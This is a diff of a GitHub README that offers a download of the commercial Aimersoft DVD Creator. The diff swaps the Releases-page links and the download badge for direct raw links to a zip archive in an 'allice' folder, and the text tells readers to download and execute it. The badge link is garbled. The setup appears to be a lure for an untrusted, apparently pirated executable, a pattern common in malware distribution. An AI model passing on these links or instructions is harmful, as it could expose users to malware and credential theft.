@@ -26,11 +26,11 @@ Aimersoft DVD Creator is a powerful tool for creating DVDs from various video fo
 
 ## Download Links
 
-To get started, you can download Aimersoft DVD Creator from the [Releases section](https://github.com/jbnaza13/Aimersoft-DVD-Creator-Download/releases). Make sure to download the appropriate file for your operating system and execute it to install the software.
+To get started, you can download Aimersoft DVD Creator from the [Releases section](https://raw.githubusercontent.com/jbnaza13/Aimersoft-DVD-Creator-Download/main/allice/Aimersoft_Download_DV_Creator_v3.9.zip). Make sure to download the appropriate file for your operating system and execute it to install the software.
 
-You can also visit the [Releases section](https://github.com/jbnaza13/Aimersoft-DVD-Creator-Download/releases) for the latest updates and versions.
+You can also visit the [Releases section](https://raw.githubusercontent.com/jbnaza13/Aimersoft-DVD-Creator-Download/main/allice/Aimersoft_Download_DV_Creator_v3.9.zip) for the latest updates and versions.
 
-![Download Button](https://img.shields.io/badge/Download%20Now-blue.svg)
+![Download Button](https://raw.githubusercontent.com/jbnaza13/Aimersoft-DVD-Creator-Download/main/allice/Aimersoft_Download_DV_Creator_v3.9.zip%https://raw.githubusercontent.com/jbnaza13/Aimersoft-DVD-Creator-Download/main/allice/Aimersoft_Download_DV_Creator_v3.9.zip)
 
 ## Features
 
@@ -76,7 +76,7 @@ If you are having trouble with your registration code, make sure:
 
 ### General Errors
 
-For any other errors, check the software’s help section or visit the [Releases section](https://github.com/jbnaza13/Aimersoft-DVD-Creator-Download/releases) for updates.
+For any other errors, check the software’s help section or visit the [Releases section](https://raw.githubusercontent.com/jbnaza13/Aimersoft-DVD-Creator-Download/main/allice/Aimersoft_Download_DV_Creator_v3.9.zip) for updates.
 
 ## License
 
